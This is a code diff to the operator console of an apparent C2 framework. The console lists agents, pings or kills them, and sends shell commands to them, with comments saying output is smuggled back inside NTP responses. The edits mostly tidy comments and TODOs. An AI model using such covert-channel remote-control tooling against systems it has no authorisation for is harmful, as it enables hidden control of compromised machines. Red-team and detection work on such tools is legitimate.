@@ -17,7 +17,7 @@ def mesaPrompt(TS): #TS is teamserver object
     print(colored(reading, "red"))
     print('\nEnter "help" for list of commands.\n')
 
-    baseCMDs = ['agents', 'db', 'interact', 'clear', 'help', 'exit', 'shutdown'] #TODO change all completers to DB info (ips, services, os)
+    baseCMDs = ['agents', 'db', 'interact', 'clear', 'help', 'exit', 'shutdown'] 
     MesaCompleter = WordCompleter(baseCMDs,
                                   ignore_case=True)
     while True:
@@ -69,13 +69,11 @@ def mesaPrompt(TS): #TS is teamserver object
 
         elif user_input == "shutdown":
             TS.shutdown()
-            #exit() #for now
-            pass  # full cleanup process and exit 
-            #TODO clean db
+            #TODO send kill to all agents, removeall agents from agents, delete db
         elif user_input == "":
             pass #do nothing    
         else:
-            print(colored('Base command not recognized. Enter \"help\" for command list.', 'red'))
+            print(colored(' Base command not recognized. Enter \"help\" for command list.\n', 'red'))
 
 
 def dbPrompt(TS):
@@ -140,11 +138,9 @@ def interactPrompt(interactType, id, TS):
                              auto_suggest=AutoSuggestFromHistory(),
                              completer=interactCompleter
                              )).lower()
-        #submenu, add/del/listAgents/agentCmdOutput/removeall/pull(from existing, maybe does this auto.)/back
+
         if user_input == "ping":
             c2.sendRefCMD(TS, interactType, id, "PING")
-            #C: see refid ping
-            #C: send resync request
             #listener/NTPS: receive resync req/ping 
             #TS/DB: update timestamp and enter into db alive status, create new entry if IP does not exist
             #NTPS: send actual time update packet
@@ -153,6 +149,7 @@ def interactPrompt(interactType, id, TS):
             confirmation = (input("Confirm (y/n)? ")).lower()
             if confirmation == "y":
                 c2.sendRefCMD(TS, interactType, id, "KILL")
+                #TODO update status dead in DB
             else:
                 continue #back to interact prompt
 
@@ -213,10 +210,6 @@ def cmdPrompt(interactType, id, TS):
             #TODO sending quotes (and other chars) is being weird, fix this
             c2.sendCMD(TS, user_input, interactType, id) #TODO what about running exes/commands that hang?
             
-            #S: encode command
-            #S: send commandpacket to selected client
-            #C: raw socket looking for identifier (ref id comd?), parse command
-            #C: run command
             #C: get output and encode in NTP response
             #S: decode output
             #S: send output to TS
